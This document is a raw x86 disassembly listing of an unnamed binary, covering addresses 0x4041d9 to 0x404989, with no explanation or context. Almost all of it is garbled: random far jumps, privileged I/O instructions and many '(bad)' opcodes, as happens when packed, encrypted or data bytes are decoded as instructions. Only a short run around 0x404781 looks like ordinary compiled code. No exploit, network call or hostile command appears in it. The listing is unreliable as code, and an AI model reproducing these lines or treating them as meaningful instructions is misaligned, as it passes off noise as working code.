  4041d9:	outs   dx,DWORD PTR ds:[esi]
  4041da:	jmp    0x13c2:0xc3630f7e
  4041e1:	dec    ebp
  4041e2:	jno    0x404165
  4041e4:	out    0x93,al
  4041e6:	lds    esp,FWORD PTR [eax]
  4041e8:	retf   
  4041e9:	inc    esp
  4041ea:	(bad)  
  4041eb:	sub    al,0x11
  4041ed:	inc    edx
  4041ee:	daa    
  4041ef:	push   ebx
  4041f0:	pop    ss
  4041f1:	pop    edi
  4041f2:	ds push ds
  4041f4:	mov    edx,0x72d09ea8
  4041f9:	sbb    ah,BYTE PTR [edi+0x0]
  4041fc:	and    ebp,DWORD PTR [ebp-0x5e5479da]
  404202:	test   BYTE PTR [eax+0xbed87d9],ah
  404208:	mov    bh,0x21
  40420a:	sti    
  40420b:	daa    
  40420c:	add    DWORD PTR [esi+0x7f],esi
  40420f:	fist   WORD PTR [esi-0xbee1d26]
  404215:	jl     0x404225
  404217:	nop
  404218:	dec    ecx
  404219:	xchg   BYTE PTR [edi],dl
  40421b:	xchg   ebp,eax
  40421c:	pusha  
  40421d:	dec    esp
  40421e:	scas   eax,DWORD PTR es:[edi]
  40421f:	stos   BYTE PTR es:[edi],al
  404220:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404221:	mov    dl,0x76
  404223:	shr    BYTE PTR [edx],cl
  404225:	mov    edi,DWORD PTR [ecx-0x59]
  404228:	jecxz  0x4041f6
  40422a:	ror    BYTE PTR [ecx-0x604f2448],cl
  404230:	retf   
  404231:	inc    eax
  404232:	sub    edx,DWORD PTR [esi+ecx*4+0x26bdf5dd]
  404239:	and    al,0xb9
  40423b:	das    
  40423c:	aaa    
  40423d:	inc    edi
  40423e:	dec    esp
  40423f:	int3   
  404240:	scas   eax,DWORD PTR es:[edi]
  404241:	jno    0x404269
  404243:	shr    DWORD PTR [eax-0x42e827fd],0x4
  40424a:	scas   eax,DWORD PTR es:[edi]
  40424b:	fcomi  st,st(5)
  40424d:	es pusha 
  40424f:	jecxz  0x4042ca
  404251:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404252:	loopne 0x404262
  404254:	xor    DWORD PTR [edi-0x73],0x7ce22ca9
  40425b:	jmp    0x404277
  40425d:	dec    ebx
  40425e:	fimul  DWORD PTR [ecx+ebx*2+0x1]
  404262:	test   ebx,edx
  404264:	es (bad) 
  404266:	test   BYTE PTR [eax-0x102a5ad4],0x3b
  40426d:	mov    al,0x7c
  40426f:	add    BYTE PTR [ebp+ebx*1+0x58846553],cl
  404276:	mov    ebx,0x614ac4c4
  40427b:	dec    eax
  40427c:	call   0x2d22b8a3
  404281:	sub    ah,dh
  404283:	test   BYTE PTR [ecx+0x203207f1],0xa0
  40428a:	iret   
  40428b:	or     ebx,edx
  40428d:	int3   
  40428e:	dec    ecx
  40428f:	mov    esp,0x84bb64bc
  404294:	addr16 out dx,eax
  404296:	xchg   DWORD PTR [esi+0x26c11705],esi
  40429c:	add    DWORD PTR [esi],0xffffffb7
  40429f:	push   es
  4042a0:	out    dx,al
  4042a1:	mov    eax,0xc6fadcff
  4042a6:	ins    DWORD PTR es:[edi],dx
  4042a7:	call   0x1a15:0x25bce282
  4042ae:	mov    edi,DWORD PTR [edx-0x2a]
  4042b1:	mov    dl,0x43
  4042b3:	add    bh,BYTE PTR [edx-0x1d]
  4042b6:	lock and DWORD PTR [edx-0x74],esi
  4042ba:	jne    0x40431a
  4042bc:	popf   
  4042bd:	sbb    ch,dl
  4042bf:	mov    ds:0x69eb4e1b,al
  4042c4:	mov    ecx,0x88c179c8
  4042c9:	mov    DWORD PTR [eax+0x2fcb545d],edi
  4042cf:	mov    eax,0xcb63d53c
  4042d4:	in     al,0x3e
  4042d6:	test   dl,ch
  4042d8:	jmp    0x40434b
  4042da:	cld    
  4042db:	jecxz  0x404339
  4042dd:	pop    ebx
  4042de:	adc    al,0x1b
  4042e0:	push   ds
  4042e1:	xchg   ebp,eax
  4042e2:	jle    0x404310
  4042e4:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4042e6:	enter  0xa03,0x1e
  4042ea:	adc    BYTE PTR [edx-0x2c],ah
  4042ed:	or     al,0xd6
  4042ef:	xchg   ebp,eax
  4042f0:	push   edx
  4042f1:	push   ecx
  4042f2:	mov    dh,0xa2
  4042f4:	mov    dl,BYTE PTR [edx-0x3e]
  4042f7:	mov    edi,0xae4a8bf9
  4042fc:	stos   DWORD PTR es:[edi],eax
  4042fd:	adc    eax,eax
  4042ff:	jae    0x404337
  404301:	ret    0xd8d3
  404304:	enter  0xc3c0,0x48
  404308:	mov    ebx,0x53856120
  40430d:	adc    bl,BYTE PTR [esi]
  40430f:	and    al,0xb2
  404311:	clc    
  404312:	pop    es
  404313:	sub    DWORD PTR [ebx-0x2b],edx
  404316:	mov    esp,0xa48a94f
  40431b:	dec    ecx
  40431c:	clc    
  40431d:	aam    0xfe
  40431f:	pop    esp
  404320:	iret   
  404321:	jp     0x404318
  404323:	add    BYTE PTR [eax-0x80],0xea
  404327:	popf   
  404328:	jne    0x404334
  40432a:	or     esi,DWORD PTR [edx]
  40432c:	popa   
  40432d:	inc    esp
  40432e:	push   edi
  40432f:	retf   
  404330:	cmp    BYTE PTR [edx-0x3a],ch
  404333:	ss daa 
  404335:	mov    esp,0x9c591a1e
  40433a:	push   esi
  40433b:	pop    ebp
  40433c:	(bad)  
  40433d:	cmp    DWORD PTR [edi+0x1fc3906],esi
  404343:	les    ebx,FWORD PTR [ecx-0x27e22d8d]
  404349:	push   esp
  40434a:	fs pop ebp
  40434c:	ds jo  0x4042f8
  40434f:	jns    0x40438e
  404351:	dec    eax
  404352:	test   eax,0x98e2addf
  404357:	je     0x404379
  404359:	sub    BYTE PTR [ebx-0x1f],cl
  40435c:	pop    esi
  40435d:	in     eax,0x12
  40435f:	jns    0x40435a
  404361:	in     al,dx
  404362:	lock arpl bx,cx
  404365:	dec    edi
  404366:	pop    es
  404367:	popa   
  404368:	repz sbb BYTE PTR [esi-0x47],0xb9
  40436d:	inc    ebp
  40436e:	fidiv  DWORD PTR ds:0x4c8825fb
  404374:	repnz cdq 
  404376:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404377:	fdiv   QWORD PTR [edi]
  404379:	xchg   BYTE PTR [edi],dh
  40437b:	xor    al,0x44
  40437d:	retf   
  40437e:	fcomip st,st(5)
  404380:	imul   esp,DWORD PTR [esi],0xe3241ba3
  404386:	adc    cl,bh
  404388:	mov    dl,dl
  40438a:	aad    0x28
  40438c:	loope  0x40437e
  40438e:	ffree  st(0)
  404390:	(bad)  [esi]
  404392:	std    
  404393:	(bad)  
  404394:	shl    BYTE PTR [eax+0x318bb6e5],0xe3
  40439b:	xchg   ebx,eax
  40439c:	cdq    
  40439d:	add    al,0xa6
  40439f:	test   eax,0xb5da7b0f
  4043a4:	mov    bl,BYTE PTR [eax-0x3a]
  4043a7:	imul   esi,esi,0x14
  4043aa:	mov    cl,BYTE PTR es:[eax+0x2402a036]
  4043b1:	inc    ebp
  4043b2:	jmp    0x150e:0x62a7413a
  4043b9:	mov    ecx,0xcc9e02ad
  4043be:	adc    al,0x8a
  4043c0:	add    al,0xeb
  4043c2:	push   edx
  4043c3:	gs dec ebx
  4043c5:	jno    0x404372
  4043c7:	jbe    0x4043c0
  4043c9:	mov    al,BYTE PTR [edi]
  4043cb:	adc    edi,DWORD PTR [edx-0x42]
  4043ce:	(bad)  
  4043cf:	fdiv   QWORD PTR [edi+eax*1+0x4d]
  4043d3:	out    dx,al
  4043d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043d5:	rol    BYTE PTR [edi+0x7e],cl
  4043d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043d9:	jo     0x404377
  4043db:	adc    bl,ch
  4043dd:	mov    DWORD PTR [ebx],edx
  4043df:	stos   BYTE PTR es:[edi],al
  4043e0:	(bad)  
  4043e1:	pop    esi
  4043e2:	mov    edi,0x8733850
  4043e7:	or     BYTE PTR [ecx-0x3e],bl
  4043ea:	daa    
  4043eb:	out    0xee,al
  4043ed:	mov    ah,0x19
  4043ef:	sbb    bl,BYTE PTR [ebp-0x1459cce0]
  4043f5:	cmp    BYTE PTR [esi+0x18],dl
  4043f8:	fisub  DWORD PTR [esi]
  4043fa:	lea    ebp,[edi]
  4043fc:	push   edx
  4043fd:	dec    eax
  4043fe:	ja     0x404385
  404400:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404401:	xor    eax,0xeeaeee9d
  404406:	or     esi,ebx
  404408:	cmp    al,0xd2
  40440a:	sbb    eax,0xf97a4cf0
  40440f:	mov    dh,0xa9
  404411:	sti    
  404412:	out    dx,eax
  404413:	shl    bh,0x2d
  404416:	adc    esp,edx
  404418:	mov    BYTE PTR [eax],ch
  40441a:	xchg   edx,eax
  40441b:	shl    BYTE PTR [ebp+0x5c],1
  40441e:	sbb    BYTE PTR [edi+0x12b5a5b8],ch
  404424:	and    ebx,eax
  404426:	and    eax,0x861999f0
  40442b:	cdq    
  40442c:	pop    edx
  40442d:	das    
  40442e:	aaa    
  40442f:	fnsave es:[edx-0x18373e6d]
  404436:	in     al,0xbd
  404438:	ror    DWORD PTR [ecx-0x51],0x2a
  40443c:	addr16 pop es
  40443e:	mov    WORD PTR [ecx-0x1e],fs
  404441:	sbb    edx,DWORD PTR [esp+edi*2+0x15]
  404445:	jnp    0x404441
  404447:	retf   0x122e
  40444a:	dec    edi
  40444b:	mov    bl,0xe1
  40444d:	mov    dl,0x96
  40444f:	sub    al,0x43
  404451:	aaa    
  404452:	mov    dh,0x11
  404454:	jmp    0x404479
  404456:	test   al,0x88
  404458:	xchg   ebp,eax
  404459:	mov    dl,0x25
  40445b:	xlat   BYTE PTR ds:[ebx]
  40445c:	push   eax
  40445d:	or     bh,BYTE PTR [edi-0x7f]
  404460:	(bad)  
  404461:	mov    ecx,DWORD PTR [ebp+0x76]
  404464:	jmp    0x4043eb
  404466:	ss sti 
  404468:	xchg   esi,eax
  404469:	jl     0x404492
  40446b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40446c:	ins    BYTE PTR es:[edi],dx
  40446d:	cmp    bh,BYTE PTR [ebx]
  40446f:	sbb    al,0xa4
  404471:	xor    edi,DWORD PTR [edx+ebx*4+0x23]
  404475:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404476:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404477:	push   es
  404478:	scas   al,BYTE PTR es:[edi]
  404479:	stc    
  40447a:	dec    ecx
  40447b:	dec    ecx
  40447c:	xor    edi,eax
  40447e:	jmp    0x404781
  404483:	add    bl,BYTE PTR [ebp+0x44]
  404486:	dec    ecx
  404487:	popa   
  404488:	jno    0x40449d
  40448a:	jne    0x4044e2
  40448c:	xor    al,0xa0
  40448e:	jle    0x40445a
  404490:	popa   
  404491:	dec    eax
  404492:	addr16 pop esi
  404494:	sbb    BYTE PTR [esi+0x7e],bh
  404497:	pop    eax
  404498:	jl     0x404518
  40449a:	jle    0x404420
  40449c:	mov    esp,0xe4c59e2b
  4044a1:	test   DWORD PTR ds:0x96d52475,ecx
  4044a7:	pop    ecx
  4044a8:	adc    DWORD PTR [ecx+0x5d],edi
  4044ab:	pop    es
  4044ac:	cwde   
  4044ad:	punpckhwd mm6,QWORD PTR [edx]
  4044b0:	frstor [ebx]
  4044b2:	je     0x404494
  4044b4:	dec    eax
  4044b5:	xchg   BYTE PTR [eax-0x40ae3ddd],al
  4044bb:	dec    edx
  4044bc:	inc    esp
  4044bd:	loope  0x404454
  4044bf:	fild   DWORD PTR [ebx]
  4044c1:	(bad)
  4044c7:	ja     0x404476
  4044c9:	jnp    0x40453a
  4044cb:	sub    al,0x13
  4044cd:	not    DWORD PTR [edx+0x20c81c9a]
  4044d3:	mov    dl,0xaa
  4044d5:	inc    edx
  4044d6:	add    ch,BYTE PTR [ecx]
  4044d8:	(bad)  
  4044d9:	ja     0x4044eb
  4044db:	sahf   
  4044dc:	addr16 pop ecx
  4044de:	mov    DWORD PTR [eax-0x2dca9284],ebp
  4044e4:	jnp    0x4044e7
  4044e6:	sbb    bl,BYTE PTR [esi-0x56]
  4044e9:	imul   ebp,DWORD PTR [edi-0x299dda6c],0xfffffff2
  4044f0:	sar    DWORD PTR [eax+ebp*1],cl
  4044f3:	lea    ecx,[edi+0x1]
  4044f6:	add    BYTE PTR [ecx-0x2daa0e60],al
  4044fc:	sbb    eax,0x1db618c5
  404501:	inc    edx
  404502:	pop    ecx
  404503:	stc    
  404504:	int3   
  404505:	add    BYTE PTR [esi],al
  404507:	add    dl,BYTE PTR [ebp-0x55]
  40450a:	repz fmul DWORD PTR [edi+0x51]
  40450e:	jnp    0x404503
  404510:	sbb    ecx,DWORD PTR [ebx+0xc4bf9b1]
  404516:	addr16 jg 0x40453b
  404519:	stc    
  40451a:	js     0x4044cb
  40451c:	in     eax,dx
  40451d:	xchg   ecx,eax
  40451e:	dec    edx
  40451f:	pop    esi
  404520:	cmp    DWORD PTR [edx+edx*2],ebp
  404523:	xor    eax,0xf156c23a
  404528:	loope  0x4044f1
  40452a:	nop
  40452b:	aas    
  40452c:	ins    DWORD PTR es:[edi],dx
  40452d:	iret   
  40452e:	scas   al,BYTE PTR es:[edi]
  40452f:	cmp    edi,edx
  404531:	mov    esi,DWORD PTR [ebx+eax*1-0x5c8a4d00]
  404538:	xchg   edx,eax
  404539:	sbb    BYTE PTR [eax+0x55ad62d],ah
  40453f:	mov    eax,0xe82a2f4b
  404544:	fwait
  404545:	ss in  eax,0x1f
  404548:	mov    dl,0x1a
  40454a:	mov    BYTE PTR [eax-0x76],dh
  40454d:	adc    al,0xd9
  40454f:	jo     0x40455f
  404551:	icebp  
  404552:	retf   0xc970
  404555:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404556:	jo     0x4045c8
  404558:	mov    WORD PTR [ebx+esi*2],ss
  40455b:	adc    eax,0xfcc14c5e
  404560:	clc    
  404561:	mov    ebp,edi
  404563:	push   cs
  404564:	not    BYTE PTR [esi+edx*2+0x23]
  404568:	adc    dl,BYTE PTR [esi+esi*2+0x11]
  40456c:	and    BYTE PTR [edx-0x3e],dh
  40456f:	pop    es
  404570:	push   esp
  404571:	test   al,0x82
  404573:	fist   DWORD PTR [esi-0x76f26934]
  404579:	fld    DWORD PTR [ebx+0x566d48c3]
  40457f:	mov    ds:0xaf5b5b94,al
  404584:	ja     0x404593
  404586:	push   ss
  404587:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404588:	and    al,0x87
  40458a:	xchg   ebx,esp
  40458c:	jge    0x4045d9
  40458e:	dec    edx
  40458f:	push   cs
  404590:	mul    BYTE PTR [esi-0x34]
  404593:	mov    eax,ds:0xa3b54b37
  404598:	push   0x65
  40459a:	jmp    0x6858c4d4
  40459f:	xchg   edx,eax
  4045a0:	adc    DWORD PTR [ebx+edi*4+0x11d7b838],0xea24b4ca
  4045ab:	inc    eax
  4045ac:	cs jle 0x40462e
  4045af:	nop
  4045b0:	cld    
  4045b1:	std    
  4045b2:	dec    edi
  4045b3:	push   ebp
  4045b4:	pop    ebp
  4045b5:	(bad)  
  4045b6:	loop   0x404601
  4045b8:	mov    eax,0x4ca900ee
  4045bd:	mov    ebx,DWORD PTR [edx+0x70]
  4045c0:	jl     0x4045d6
  4045c2:	inc    ebx
  4045c3:	icebp  
  4045c4:	pop    ebx
  4045c5:	test   al,0xc7
  4045c7:	mov    WORD PTR [edi+ebx*8+0xf69b9],?
  4045ce:	and    DWORD PTR [esi],eax
  4045d0:	shl    BYTE PTR [ecx+edi*1+0x4c87afdc],0x8e
  4045d8:	daa    
  4045d9:	shr    DWORD PTR [esi+0x79],1
  4045dc:	push   edi
  4045dd:	sub    eax,0x7cd571a9
  4045e2:	in     eax,dx
  4045e3:	and    eax,0xaf2c7a4c
  4045e8:	ds mov edx,0x1118d26e
  4045ee:	cvtps2pi mm2,QWORD PTR [esi+0x617f74c7]
  4045f5:	imul   esi,DWORD PTR [esi-0x60],0x19
  4045f9:	or     cl,BYTE PTR [edi-0x42]
  4045fc:	popa   
  4045fd:	pop    edi
  4045fe:	icebp  
  4045ff:	rol    DWORD PTR [ebp+eiz*1-0x47],cl
  404603:	lahf   
  404604:	stc    
  404605:	js     0x4045dc
  404607:	xchg   ebp,eax
  404608:	lea    eax,[ecx]
  40460a:	enter  0xeb0d,0x5e
  40460e:	mov    dh,0x73
  404610:	push   ebx
  404611:	outs   dx,BYTE PTR ds:[esi]
  404612:	mov    al,0x5e
  404614:	mov    eax,0x55dc8d75
  404619:	xchg   edx,eax
  40461a:	mov    BYTE PTR [ecx+0x1a],al
  40461d:	(bad)  
  40461e:	mov    esi,0x46f9103e
  404623:	mov    ebp,0x2643e93
  404628:	ja     0x4045b5
  40462a:	test   BYTE PTR [ebx+0x4c],bl
  40462d:	xchg   ebx,eax
  40462e:	data16 cmp dh,BYTE PTR [eax]
  404631:	xor    dh,BYTE PTR [esi-0xbde3d0d]
  404637:	clc    
  404638:	cmc    
  404639:	push   eax
  40463a:	jo     0x404604
  40463c:	cwde   
  40463d:	out    dx,al
  40463e:	cmp    DWORD PTR [esi-0x75],0xc6dcdebf
  404645:	xor    al,0xa3
  404647:	push   esp
  404648:	je     0x4046c2
  40464a:	pop    ss
  40464b:	push   0x2cd5b0ff
  404650:	repnz push esi
  404652:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404653:	cmp    eax,0x5579a7e4
  404658:	fdivr  QWORD PTR [edx]
  40465a:	pop    ebp
  40465b:	(bad)  
  40465c:	xchg   esi,eax
  40465d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40465e:	call   0xeaf9fec
  404663:	adc    BYTE PTR [ebx],cl
  404665:	sar    cl,0x7f
  404668:	adc    esp,DWORD PTR ds:0x773fcf1a
  40466e:	ss enter 0x344a,0x9b
  404673:	(bad)  
  404674:	ja     0x40461b
  404676:	sub    al,0x9f
  404678:	fldpi  
  40467a:	adc    eax,0xecb69a95
  40467f:	mov    edx,0xe8893d43
  404684:	push   eax
  404685:	or     edx,0xfb727028
  40468b:	inc    esi
  40468c:	xor    BYTE PTR [esi],al
  40468e:	add    DWORD PTR [ebp+esi*8-0xc],edi
  404692:	and    esi,DWORD PTR [ecx+0x3caee88e]
  404698:	push   ecx
  404699:	pop    esp
  40469a:	and    eax,0x53628a78
  40469f:	push   esi
  4046a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046a1:	scas   al,BYTE PTR es:[edi]
  4046a2:	dec    ebp
  4046a3:	lds    eax,FWORD PTR [edi+ebp*2-0x75b18530]
  4046aa:	and    DWORD PTR [ebp+0x3ceed51b],ecx
  4046b0:	pop    esi
  4046b1:	fild   WORD PTR [edx]
  4046b3:	sub    eax,0x3b5fe085
  4046b8:	adc    al,BYTE PTR [esi]
  4046ba:	inc    eax
  4046bb:	xchg   edx,edx
  4046bd:	mov    bh,0xd
  4046bf:	hlt    
  4046c0:	ficomp DWORD PTR [ecx]
  4046c2:	inc    edi
  4046c3:	cmc    
  4046c4:	mov    bh,0x4a
  4046c6:	mov    ebx,0xeca48e78
  4046cb:	jl     0x4046bf
  4046cd:	push   es
  4046ce:	or     eax,0x4b6654c4
  4046d3:	fcom   QWORD PTR [ebp+0x29]
  4046d6:	fwait
  4046d7:	test   al,0x32
  4046d9:	ins    DWORD PTR es:[edi],dx
  4046da:	outs   dx,DWORD PTR ds:[esi]
  4046db:	push   edx
  4046dc:	and    al,0x42
  4046de:	jg     0x4046a9
  4046e0:	aas    
  4046e1:	data16 jl 0x404744
  4046e4:	(bad)  
  4046e5:	xor    ebx,DWORD PTR [edi+0xb]
  4046e8:	fidiv  DWORD PTR [esi+esi*2]
  4046eb:	pop    ss
  4046ec:	or     DWORD PTR [esi],edx
  4046ee:	jb     0x404719
  4046f0:	sub    DWORD PTR [ebp+0xf],esp
  4046f3:	test   DWORD PTR [eax],0x861afe3
  4046f9:	mov    esp,0x577eedcc
  4046fe:	js     0x40473c
  404700:	mov    WORD PTR [ebx+edi*4-0x4a18f22c],cs
  404707:	fisttp DWORD PTR [eax]
  404709:	test   DWORD PTR [esp+edx*4+0x26],0x649180a4
  404711:	and    ebx,DWORD PTR [ebx+0x3a58cf64]
  404717:	mov    esp,0xf4a68bba
  40471c:	jo     0x4046f1
  40471e:	pop    ebx
  40471f:	sahf   
  404720:	loope  0x404726
  404722:	jmp    0x404752
  404724:	lock push edi
  404726:	aam    0xea
  404728:	mov    bh,0xcd
  40472a:	sbb    al,0x57
  40472c:	and    esi,ebx
  40472e:	inc    edi
  40472f:	cmp    DWORD PTR [esi+0x3932d656],0x64bfd90a
  404739:	add    al,0x28
  40473b:	adc    al,0x3f
  40473d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40473e:	fdivr  QWORD PTR [eax]
  404740:	cmp    DWORD PTR [ecx],0x170ec03
  404746:	out    0x7c,eax
  404748:	xchg   BYTE PTR [esi],bh
  40474a:	jge    0x40472a
  40474c:	scas   eax,DWORD PTR es:[edi]
  40474d:	aaa    
  40474e:	mov    dl,0xbf
  404750:	scas   eax,DWORD PTR es:[edi]
  404751:	xchg   BYTE PTR [ebp+0x4b],al
  404754:	add    eax,0x2324df24
  404759:	xchg   esi,eax
  40475a:	and    DWORD PTR [ecx+0x5d],esi
  40475d:	or     BYTE PTR [edi],cl
  40475f:	add    DWORD PTR [edi],ebx
  404761:	fldlg2 
  404763:	gs loope 0x404729
  404766:	arpl   WORD PTR [eax+0x35093bfe],di
  40476c:	inc    ecx
  40476d:	cmp    al,0xb1
  40476f:	mov    eax,0x2e03ed02
  404774:	mov    eax,ds:0x581d87fd
  404779:	push   ss
  40477a:	dec    edi
  40477b:	xchg   edi,eax
  40477c:	cmp    dl,BYTE PTR [esi]
  40477e:	sbb    BYTE PTR [ecx],al
  404780:	clc    
  404781:	xor    edx,eax
  404783:	add    edi,ecx
  404785:	add    edx,ecx
  404787:	imul   edx,edi
  40478a:	mov    DWORD PTR [ebp+0xc],edx
  40478d:	mov    edx,DWORD PTR [ebp+0xc]
  404790:	mov    DWORD PTR [ebp-0x24],edx
  404793:	mov    edx,DWORD PTR [ebp-0x8]
  404796:	add    edx,DWORD PTR [ebp-0x40]
  404799:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  4047a0:	mov    DWORD PTR [ebp-0x1c],edx
  4047a3:	jmp    0x404aa6
  4047a8:	sub    ch,BYTE PTR [eax+edi*1+0x6b69b8ad]
  4047af:	test   eax,0xf2c2fa45
  4047b4:	cmp    al,0x3f
  4047b6:	jge    0x404779
  4047b8:	mov    eax,0x587e7e27
  4047bd:	jl     0x40483d
  4047bf:	jle    0x404788
  4047c1:	or     al,0x2b
  4047c3:	aas    
  4047c4:	add    esp,DWORD PTR [esi-0x44]
  4047c7:	push   ds
  4047c8:	not    DWORD PTR [edi]
  4047ca:	pop    ss
  4047cb:	push   esp
  4047cc:	out    0xfe,al
  4047ce:	fs cwde 
  4047d0:	jg     0x404783
  4047d2:	mov    DWORD PTR [ebx+edi*1+0x173df6d0],edx
  4047d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047da:	mov    es,WORD PTR [edx+0x65]
  4047dd:	adc    eax,0xc979acd8
  4047e2:	aam    0x54
  4047e4:	inc    edi
  4047e5:	sbb    al,0x8d
  4047e7:	push   ebx
  4047e8:	push   edx
  4047e9:	pop    ss
  4047ea:	adc    eax,0x51a727a4
  4047ef:	test   al,0x75
  4047f1:	arpl   WORD PTR [eax-0x1caf748d],ax
  4047f7:	and    DWORD PTR [eax+ebp*8],ebp
  4047fa:	out    dx,al
  4047fb:	mov    ?,WORD PTR [eax+eiz*4-0x5c420df2]
  404802:	sbb    BYTE PTR [edi+0x2],0x3
  404806:	call   0x93da:0x5223602b
  40480d:	and    DWORD PTR [ebp+0x4d],esp
  404810:	iret   
  404811:	nop
  404812:	ret    
  404813:	pop    esp
  404814:	sub    esi,ebx
  404816:	lods   al,BYTE PTR ds:[esi]
  404817:	sub    edx,DWORD PTR [esi+edi*2-0x30dfd5ac]
  40481e:	inc    esp
  40481f:	outs   dx,BYTE PTR ds:[esi]
  404820:	fcom   DWORD PTR [ecx+0x56]
  404823:	adc    bh,ch
  404825:	push   edx
  404826:	mov    ah,0x40
  404828:	and    ecx,DWORD PTR [ebp-0x4c]
  40482b:	(bad)  
  40482c:	and    dh,BYTE PTR [ecx+0x54]
  40482f:	xchg   ecx,eax
  404830:	ja     0x40489c
  404832:	pop    eax
  404833:	sbb    eax,0x399ed9ac
  404838:	fsub   QWORD PTR [ecx+0x67f8963b]
  40483e:	xlat   BYTE PTR ds:[ebx]
  40483f:	js     0x404870
  404841:	add    al,0x78
  404843:	mov    ecx,0xabf4b679
  404848:	ja     0x404891
  40484a:	adc    ebp,esp
  40484c:	lahf   
  40484d:	xlat   BYTE PTR ds:[ebx]
  40484e:	sahf   
  40484f:	inc    edi
  404850:	leave  
  404851:	dec    eax
  404852:	js     0x404800
  404854:	and    BYTE PTR [esi-0x2a],ch
  404857:	sbb    DWORD PTR [ebx-0x2153c906],eax
  40485d:	mov    esp,DWORD PTR [edx+0x65e0dec9]
  404863:	mov    esi,0x4bc6c752
  404868:	sbb    dh,BYTE PTR [ebp+ebp*2-0x42c029a5]
  40486f:	(bad)  
  404870:	xor    DWORD PTR [ecx+0x73],ebp
  404873:	shr    BYTE PTR [ebp+ebx*4+0x66],cl
  404877:	jecxz  0x404831
  404879:	or     cl,BYTE PTR [ecx]
  40487b:	mov    ds:0x51d1fd05,al
  404880:	add    eax,0x34d3fefd
  404885:	dec    edx
  404886:	mov    bh,0x56
  404888:	shl    DWORD PTR [esi-0x5fb7151c],1
  40488e:	inc    eax
  40488f:	adc    al,0xee
  404891:	repz push edx
  404893:	clc    
  404894:	outs   dx,BYTE PTR ds:[esi]
  404895:	aas    
  404896:	mov    bh,0xcd
  404898:	fdivp  st(7),st
  40489a:	ret    
  40489b:	loop   0x404909
  40489d:	repz sub BYTE PTR [eax],ch
  4048a0:	clc    
  4048a1:	mov    ds:0x6d11d558,al
  4048a6:	dec    esp
  4048a7:	arpl   WORD PTR [edx+0xb2a706],ax
  4048ad:	jo     0x4048e1
  4048af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048b0:	cli    
  4048b1:	push   0x21
  4048b3:	cdq    
  4048b4:	inc    ecx
  4048b5:	loope  0x404912
  4048b7:	popf   
  4048b8:	in     al,dx
  4048b9:	cli    
  4048ba:	icebp  
  4048bb:	leave  
  4048bc:	(bad)  
  4048bd:	jecxz  0x40490b
  4048bf:	xor    edi,ebp
  4048c1:	lea    esp,[esi]
  4048c3:	cmova  edx,DWORD PTR [ebx]
  4048c6:	mov    bh,0x87
  4048c8:	xchg   ebx,eax
  4048c9:	lods   al,BYTE PTR ds:[esi]
  4048ca:	fisubr WORD PTR [ebp-0x1908c2f3]
  4048d0:	pop    ss
  4048d1:	adc    BYTE PTR [edx],ah
  4048d3:	rol    DWORD PTR [esi+0x2bcea4f1],cl
  4048d9:	ror    ecx,cl
  4048db:	sbb    BYTE PTR [ecx-0x6d1e379c],cl
  4048e1:	cmp    BYTE PTR [edx],ah
  4048e3:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4048e5:	mov    cl,BYTE PTR [ebp+0x0]
  4048e8:	jle    0x4048ca
  4048ea:	retf   
  4048eb:	dec    ebp
  4048ec:	fadd   DWORD PTR [ebp-0x7f]
  4048ef:	(bad)  
  4048f0:	rcr    DWORD PTR [edi+0x697306ec],1
  4048f6:	sub    eax,0xab6825e3
  4048fb:	add    DWORD PTR [esp+ebp*4-0x1b],eax
  4048ff:	cmp    eax,0xeaa331ac
  404904:	push   es
  404905:	(bad)  
  404906:	into   
  404907:	jmp    0x3e42:0x60416910
  40490e:	or     al,0x2e
  404910:	pop    esp
  404911:	jb     0x4048c9
  404913:	xor    edi,edi
  404915:	fsubp  st(1),st
  404917:	fbld   TBYTE PTR [eax]
  404919:	dec    esp
  40491a:	nop
  40491b:	leave  
  40491c:	mov    esp,0xbd467aae
  404921:	pop    eax
  404922:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404923:	adc    eax,0xc049a83a
  404928:	sub    esp,ebp
  40492a:	stos   DWORD PTR es:[edi],eax
  40492b:	test   BYTE PTR [eax-0x2ef864fe],bh
  404931:	ins    DWORD PTR es:[edi],dx
  404932:	es icebp 
  404934:	xchg   edi,eax
  404935:	push   ecx
  404937:	in     eax,0x3a
  404939:	cmp    ecx,ebx
  40493b:	imul   ecx,DWORD PTR [ecx-0x7aa5e5e2],0x4dc89b92
  404945:	sbb    al,0x4
  404947:	and    esp,ebx
  404949:	(bad)  
  40494a:	pop    ecx
  40494b:	mov    ch,0xa4
  40494d:	sub    DWORD PTR [esp+ebp*8+0x1d],0x30
  404952:	fmulp  st(5),st
  404954:	data16 sbb cl,cl
  404957:	outs   dx,BYTE PTR ds:[esi]
  404958:	xchg   esi,eax
  404959:	fcom   DWORD PTR [ecx+0x0]
  40495c:	popf   
  40495d:	mov    edi,0xb92a0d87
  404962:	jo     0x40498b
  404964:	out    0x25,eax
  404966:	and    eax,0x7bd14330
  40496b:	pop    ss
  40496c:	mov    ebp,0xc0f48747
  404971:	xchg   ecx,eax
  404972:	add    BYTE PTR [ebx+esi*1-0x7024458d],ah
  404979:	fdivr  st(4),st
  40497b:	in     al,dx
  40497c:	sbb    eax,0x4c021c86
  404981:	or     al,0x4a
  404983:	sub    al,0x38
  404985:	jbe    0x4049e7
  404987:	jp     0x404924
  404989:	push   edi
